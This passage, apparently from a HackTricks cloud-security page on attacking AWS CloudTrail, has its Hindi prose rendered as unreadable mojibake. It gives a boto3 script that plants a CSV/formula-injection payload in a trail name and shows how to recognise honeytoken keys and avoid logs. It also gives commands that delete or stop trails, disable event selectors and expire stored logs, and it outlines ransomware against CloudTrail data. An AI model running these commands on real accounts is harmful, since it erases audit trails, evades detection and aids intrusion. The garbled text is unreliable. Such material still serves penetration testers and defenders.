рдЗрд╕рд▓рд┐рдП, Access Advisor **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рджреА рдЬрд╛ рд░рд╣реА рдЕрдирд╛рд╡рд╢реНрдпрдХ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕реВрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ** рддрд╛рдХрд┐ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдЙрдиреНрд╣реЗрдВ рд╣рдЯрд╛ рд╕рдХреЗрдВ
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

## Actions

### Enumeration
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **CSV Injection**

CloudTrail рдХреЗ рдЕрдВрджрд░ рдПрдХ CVS injection рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдЬреЛ рдордирдорд╛рдирд╛ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧрд╛ рдпрджрд┐ рд▓реЙрдЧреНрд╕ рдХреЛ CSV рдореЗрдВ рдирд┐рд░реНрдпрд╛рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ Excel рдХреЗ рд╕рд╛рде рдЦреЛрд▓рд╛ рдЬрд╛рддрд╛ рд╣реИред\
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛрдб рдПрдХ рдЦрд░рд╛рдм Trail рдирд╛рдо рдХреЗ рд╕рд╛рде рд▓реЙрдЧ рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдЙрддреНрдкрдиреНрди рдХрд░реЗрдЧрд╛ рдЬрд┐рд╕рдореЗрдВ payload рд╢рд╛рдорд┐рд▓ рд╣реИ:
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
CSV рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдкреЗрдЬ рджреЗрдЦреЗрдВ:

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

рдЗрд╕ рд╡рд┐рд╢реЗрд╖ рддрдХрдиреАрдХ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ [https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)

## **рдбрд┐рдЯреЗрдХреНрд╢рди рдмрд╛рдпрдкрд╛рд╕ рдХрд░реЗрдВ**

### HoneyTokens **рдмрд╛рдпрдкрд╛рд╕**

Honeyokens рдХреЛ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрд╢рди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ** рдХреЗ рд▓рд┐рдП рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИред AWS рдХреЗ рдорд╛рдорд▓реЗ рдореЗрдВ, рдпреЗ **AWS рдХреБрдВрдЬрд┐рдпрд╛рдБ рд╣реИрдВ рдЬрд┐рдирдХреЗ рдЙрдкрдпреЛрдЧ рдХреА рдирд┐рдЧрд░рд╛рдиреА рдХреА рдЬрд╛рддреА рд╣реИ**, рдпрджрд┐ рдХреЛрдИ рдЙрд╕ рдХреБрдВрдЬреА рдХреЗ рд╕рд╛рде рдХреЛрдИ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдХрд┐рд╕реА рдиреЗ рдЙрд╕ рдХреБрдВрдЬреА рдХреЛ рдЪреБрд░рд╛ рд▓рд┐рдпрд╛ рд╣реЛрдЧрд╛ред

рд╣рд╛рд▓рд╛рдВрдХрд┐, [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren) рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдП рдЧрдП Honeytokens рдпрд╛ рддреЛ рдкрд╣рдЪрд╛рдирдиреЗ рдпреЛрдЧреНрдп рдЦрд╛рддрд╛ рдирд╛рдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рдпрд╛ рдЕрдкрдиреЗ рд╕рднреА рдЧреНрд░рд╛рд╣рдХреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рд╣реА AWS рдЦрд╛рддрд╛ ID рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдк рдЦрд╛рддрд╛ рдирд╛рдо рдФрд░/рдпрд╛ рдЦрд╛рддрд╛ ID рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдмрд┐рдирд╛ Cloudtrail рдХреЛ рдХреЛрдИ рд▓реЙрдЧ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП, **рддреЛ рдЖрдк рдЬрд╛рди рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреБрдВрдЬреА рдПрдХ honeytoken рд╣реИ рдпрд╛ рдирд╣реАрдВ**ред

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam\_\_detect\_honeytokens/main.py#L57) рдХреЗ рдкрд╛рд╕ рдХреБрдЫ рдирд┐рдпрдо рд╣реИрдВ рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдХреБрдВрдЬреА [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)** рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рд╣реИ рдпрд╛ рдирд╣реАрдВ:**

* рдпрджрд┐ **`canarytokens.org`** рднреВрдорд┐рдХрд╛ рдирд╛рдо рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗрддрд╛ рд╣реИ рдпрд╛ рдЦрд╛рддрд╛ ID **`534261010715`** рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗрддреА рд╣реИред
* рд╣рд╛рд▓ рд╣реА рдореЗрдВ рдкрд░реАрдХреНрд╖рдг рдХрд░рддреЗ рд╕рдордп, рд╡реЗ рдЦрд╛рддрд╛ **`717712589309`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рдФрд░ рдЕрднреА рднреА рдирд╛рдо рдореЗрдВ **`canarytokens.com`** рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╣реИред
* рдпрджрд┐ **`SpaceCrab`** рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдореЗрдВ рднреВрдорд┐рдХрд╛ рдирд╛рдо рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗрддрд╛ рд╣реИ
* **SpaceSiren** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **uuids** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ: `[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
* рдпрджрд┐ **рдирд╛рдо рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рд░реВрдк рд╕реЗ рдЙрддреНрдкрдиреНрди** рдЬреИрд╕рд╛ рджрд┐рдЦрддрд╛ рд╣реИ, рддреЛ рдЙрдЪреНрдЪ рд╕рдВрднрд╛рд╡рдирд╛рдПрдБ рд╣реИрдВ рдХрд┐ рдпрд╣ рдПрдХ HoneyToken рд╣реИред

#### рдХреБрдВрдЬреА ID рд╕реЗ рдЦрд╛рддрд╛ ID рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ

рдЖрдк **рдПрдХреНрд╕реЗрд╕ рдХреБрдВрдЬреА** рдХреЗ рдЕрдВрджрд░ **рдПрдиреНрдХреЛрдбреЗрдб** рд╕реЗ **рдЦрд╛рддрд╛ ID** рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕рд╛ рдХрд┐ [**рдпрд╣рд╛рдВ рд╕рдордЭрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489) рдФрд░ рдЕрдкрдиреЗ Honeytokens AWS рдЦрд╛рддреЛрдВ рдХреА рд╕реВрдЪреА рдХреЗ рд╕рд╛рде рдЦрд╛рддрд╛ ID рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ:
```python
import base64
import binascii

def AWSAccount_from_AWSKeyID(AWSKeyID):

trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix
x = base64.b32decode(trimmed_AWSKeyID) #base32 decode
y = x[0:6]

z = int.from_bytes(y, byteorder='big', signed=False)
mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)

e = (z & mask)>>7
return (e)

print("account id:" + "{:012d}".format(AWSAccount_from_AWSKeyID("ASIAQNZGKIQY56JQ7WML")))
```
Check more information in the [**orginal research**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489).

#### рд▓реЙрдЧ рдЙрддреНрдкрдиреНрди рди рдХрд░реЗрдВ

рдЗрд╕рдХрд╛ рд╕рдмрд╕реЗ рдкреНрд░рднрд╛рд╡реА рддрд░реАрдХрд╛ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдПрдХ рд╕рд░рд▓ рд╣реИред рдмрд╕ рдЙрд╕ рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдЬреЛ рдЖрдкрдиреЗ рдЕрднреА-рдЕрднреА рдХрд┐рд╕реА рд╕реЗрд╡рд╛ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдкрдиреЗ рд╣рдорд▓рд╛рд╡рд░ рдЦрд╛рддреЗ рдХреЗ рдЕрдВрджрд░ рдкрд╛рдИ рд╣реИред рдпрд╣ **CloudTrail рдХреЛ рдЖрдкрдХреЗ рдЕрдкрдиреЗ AWS рдЦрд╛рддреЗ рдХреЗ рдЕрдВрджрд░ рд▓реЙрдЧ рдЙрддреНрдкрдиреНрди рдХрд░реЗрдЧрд╛ рдФрд░ рдкреАрдбрд╝рд┐рдд рдХреЗ рдЕрдВрджрд░ рдирд╣реАрдВ**ред

рдмрд╛рдд рдпрд╣ рд╣реИ рдХрд┐ рдЖрдЙрдЯрдкреБрдЯ рдЖрдкрдХреЛ рдПрдХ рддреНрд░реБрдЯрд┐ рджрд┐рдЦрд╛рдПрдЧрд╛ рдЬрд┐рд╕рдореЗрдВ рдЦрд╛рддрд╛ рдЖрдИрдбреА рдФрд░ рдЦрд╛рддрд╛ рдирд╛рдо рдХрд╛ рд╕рдВрдХреЗрдд рдорд┐рд▓реЗрдЧрд╛ рддрд╛рдХрд┐ **рдЖрдк рджреЗрдЦ рд╕рдХреЗрдВ рдХрд┐ рдпрд╣ рдПрдХ рд╣рдиреАрдЯреЛрдХрди рд╣реИ рдпрд╛ рдирд╣реАрдВ**ред

#### рд▓реЙрдЧ рдХреЗ рдмрд┐рдирд╛ AWS рд╕реЗрд╡рд╛рдПрдВ

рдЕрддреАрдд рдореЗрдВ рдХреБрдЫ **AWS рд╕реЗрд╡рд╛рдПрдВ рдереАрдВ рдЬреЛ CloudTrail рдХреЛ рд▓реЙрдЧ рдирд╣реАрдВ рднреЗрдЬрддреА рдереАрдВ** (рдПрдХ [рд╕реВрдЪреА рдпрд╣рд╛рдВ рдкрд╛рдПрдВ](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html))ред рдЙрди рд╕реЗрд╡рд╛рдУрдВ рдореЗрдВ рд╕реЗ рдХреБрдЫ **рддреНрд░реБрдЯрд┐** рдХреЗ рд╕рд╛рде **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рджреЗрдВрдЧреА рдЬрд┐рд╕рдореЗрдВ **рдХреБрдВрдЬреА рднреВрдорд┐рдХрд╛ рдХрд╛ ARN** рд╢рд╛рдорд┐рд▓ рд╣реЛрдЧрд╛ рдпрджрд┐ рдХреЛрдИ рдЕрдирдзрд┐рдХреГрдд рд╡реНрдпрдХреНрддрд┐ (рд╣рдиреАрдЯреЛрдХрди рдХреБрдВрдЬреА) рдЗрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИред

рдЗрд╕ рддрд░рд╣, рдПрдХ **рд╣рдорд▓рд╛рд╡рд░ рдмрд┐рдирд╛ рдХрд┐рд╕реА рд▓реЙрдЧ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдП рдХреБрдВрдЬреА рдХрд╛ ARN рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред ARN рдореЗрдВ рд╣рдорд▓рд╛рд╡рд░ **AWS рдЦрд╛рддрд╛ рдЖрдИрдбреА рдФрд░ рдирд╛рдо** рджреЗрдЦ рд╕рдХрддрд╛ рд╣реИ, рд╣рдиреАрдЯреЛрдХрди рдХреА рдХрдВрдкрдирд┐рдпреЛрдВ рдХреЗ рдЦрд╛рддреЗ рдХреА рдЖрдИрдбреА рдФрд░ рдирд╛рдо рдЬрд╛рдирдирд╛ рдЖрд╕рд╛рди рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЗрд╕ рддрд░рд╣ рд╣рдорд▓рд╛рд╡рд░ рдкрд╣рдЪрд╛рди рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдЯреЛрдХрди рд╣рдиреАрдЯреЛрдХрди рд╣реИ рдпрд╛ рдирд╣реАрдВред

![](<../../../../.gitbook/assets/image (93).png>)

{% hint style="danger" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд╕рднреА рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдПрдкреАрдЖрдИ рдЬреЛ CloudTrail рд▓реЙрдЧ рдирд╣реАрдВ рдмрдирд╛ рд░рд╣реЗ рдереЗ, рдЕрдм рдареАрдХ рдХрд░ рджрд┐рдП рдЧрдП рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдЖрдкрдХреЛ рдЕрдкрдирд╛ рдЦреБрдж рдХрд╛ рдЦреЛрдЬрдирд╛ рдкрдбрд╝реЗ...

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [**рдореВрд▓ рд╢реЛрдз**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/) рджреЗрдЦреЗрдВред
{% endhint %}

### рддреГрддреАрдпрдХ рдЗрдиреНрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░ рддрдХ рдкрд╣реБрдВрдЪрдирд╛

рдХреБрдЫ AWS рд╕реЗрд╡рд╛рдПрдВ **рдХреБрдЫ рдЗрдиреНрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░ рдЙрддреНрдкрдиреНрди рдХрд░реЗрдВрдЧреА** рдЬреИрд╕реЗ **рдбреЗрдЯрд╛рдмреЗрд╕** рдпрд╛ **рдХреБрдмреЗрд░рдиреЗрдЯреНрд╕** рдХреНрд▓рд╕реНрдЯрд░ (EKS)ред рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЬреЛ **рдЙрди рд╕реЗрд╡рд╛рдУрдВ рд╕реЗ рд╕реАрдзреЗ рдмрд╛рдд рдХрд░ рд░рд╣рд╛ рд╣реИ** (рдЬреИрд╕реЗ рдХреБрдмреЗрд░рдиреЗрдЯреНрд╕ рдПрдкреАрдЖрдИ) **AWS рдПрдкреАрдЖрдИ рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░реЗрдЧрд╛**, рдЗрд╕рд▓рд┐рдП CloudTrail рдЗрд╕ рд╕рдВрдЪрд╛рд░ рдХреЛ рдирд╣реАрдВ рджреЗрдЦ рдкрд╛рдПрдЧрд╛ред

рдЗрд╕рд▓рд┐рдП, EKS рддрдХ рдкрд╣реБрдВрдЪ рд░рдЦрдиреЗ рд╡рд╛рд▓рд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЬрд┐рд╕рдиреЗ EKS API рдХрд╛ URL рдЦреЛрдЬ рд▓рд┐рдпрд╛ рд╣реИ, рд╡рд╣ рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рдПрдХ рдЯреЛрдХрди рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ **CloudTrail рджреНрд╡рд╛рд░рд╛ рдкрддрд╛ рд▓рдЧрд╛рдП рдмрд┐рдирд╛ рд╕реАрдзреЗ рдПрдкреАрдЖрдИ рд╕реЗрд╡рд╛ рд╕реЗ рдмрд╛рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдореЗрдВ:

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### CloudTrail рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛

#### рдЯреНрд░реЗрд▓реНрд╕ рд╣рдЯрд╛рдПрдВ
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### Stop trails

CloudTrail рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:

```bash
aws cloudtrail stop-logging --name <trail-name>
```

рдпрд╣ рдХрдорд╛рдВрдб CloudTrail рд▓реЙрдЧрд┐рдВрдЧ рдХреЛ рд░реЛрдХ рджреЗрдЧрд╛ред
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### рдорд▓реНрдЯреА-рд░реАрдЬрди рд▓реЙрдЧрд┐рдВрдЧ рдХреЛ рдЕрдХреНрд╖рдо рдХрд░реЗрдВ

{% code overflow="wrap" %}
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
{% endcode %}

#### рдЗрд╡реЗрдВрдЯ рд╕реЗрд▓реЗрдХреНрдЯрд░реНрд╕ рджреНрд╡рд╛рд░рд╛ рд▓реЙрдЧрд┐рдВрдЧ рдХреЛ рдЕрдХреНрд╖рдо рдХрд░реЗрдВ

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

рдкрд╣рд▓реЗ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ, рдПрдХрд▓ рдЗрд╡реЗрдВрдЯ рд╕реЗрд▓реЗрдХреНрдЯрд░ рдХреЛ рдПрдХ JSON array рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХрд▓ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рд╕рд╛рде рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред `"ReadWriteType": "ReadOnly"` рдЗрдВрдЧрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ **рдЗрд╡реЗрдВрдЯ рд╕реЗрд▓реЗрдХреНрдЯрд░ рдХреЛ рдХреЗрд╡рд▓ read-only рдЗрд╡реЗрдВрдЯреНрд╕ рдХреЛ рд╣реА рдХреИрдкреНрдЪрд░ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП** (рдЗрд╕рд▓рд┐рдП CloudTrail insights **write рдЗрд╡реЗрдВрдЯреНрд╕ рдХреА рдЬрд╛рдВрдЪ рдирд╣реАрдВ рдХрд░реЗрдЧрд╛** рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП)ред

рдЖрдк рдЕрдкрдиреА рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдЗрд╡реЗрдВрдЯ рд╕реЗрд▓реЗрдХреНрдЯрд░ рдХреЛ рдХрд╕реНрдЯрдорд╛рдЗрдЬрд╝ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

#### S3 lifecycle policy рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд▓реЙрдЧреНрд╕ рдбрд┐рд▓реАрд╢рди

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### рдмрдХреЗрдЯ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛

* S3 рдмрдХреЗрдЯ рдХреЛ рд╣рдЯрд╛рдПрдВ
* рдмрдХреЗрдЯ рдиреАрддрд┐ рдХреЛ рдмрджрд▓реЗрдВ рддрд╛рдХрд┐ CloudTrail рд╕реЗрд╡рд╛ рд╕реЗ рдХреЛрдИ рднреА рд▓реЗрдЦрди рдЕрд╕реНрд╡реАрдХрд╛рд░ рд╣реЛ рдЬрд╛рдП
* S3 рдмрдХреЗрдЯ рдореЗрдВ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЛ рд╣рдЯрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЬреАрд╡рдирдЪрдХреНрд░ рдиреАрддрд┐ рдЬреЛрдбрд╝реЗрдВ
* CloudTrail рд▓реЙрдЧреНрд╕ рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХреА рдЧрдИ kms рдХреБрдВрдЬреА рдХреЛ рдЕрдХреНрд╖рдо рдХрд░реЗрдВ

### Cloudtrail рд░реИрдВрд╕рдорд╡реЗрдпрд░

#### S3 рд░реИрдВрд╕рдорд╡реЗрдпрд░

рдЖрдк **рдПрдХ рдЕрд╕рдордорд┐рдд рдХреБрдВрдЬреА рдЙрддреНрдкрдиреНрди** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **CloudTrail рдХреЛ рдЙрд╕ рдХреБрдВрдЬреА рдХреЗ рд╕рд╛рде рдбреЗрдЯрд╛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдирд┐рдЬреА рдХреБрдВрдЬреА рдХреЛ рд╣рдЯрд╛ рд╕рдХрддреЗ рд╣реИрдВ** рддрд╛рдХрд┐ CloudTrail рд╕рд╛рдордЧреНрд░реА рдХреЛ рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред\
рдпрд╣ рдореВрд▓ рд░реВрдк рд╕реЗ рдПрдХ **S3-KMS рд░реИрдВрд╕рдорд╡реЗрдпрд░** рд╣реИ рдЬрд┐рд╕реЗ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рд╕рдордЭрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ:

{% content-ref url="../../aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**KMS рд░реИрдВрд╕рдорд╡реЗрдпрд░**

рдпрд╣ рдкрд┐рдЫрд▓реЗ рд╣рдорд▓реЗ рдХреЛ рдЕрд▓рдЧ-рдЕрд▓рдЧ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХреЗ рд╕рд╛рде рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ рд╣реИ:

{% content-ref url="../../aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **рд╕рдВрджрд░реНрдн**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдУрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рд╣рдореЗрдВ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>
{% endhint %}
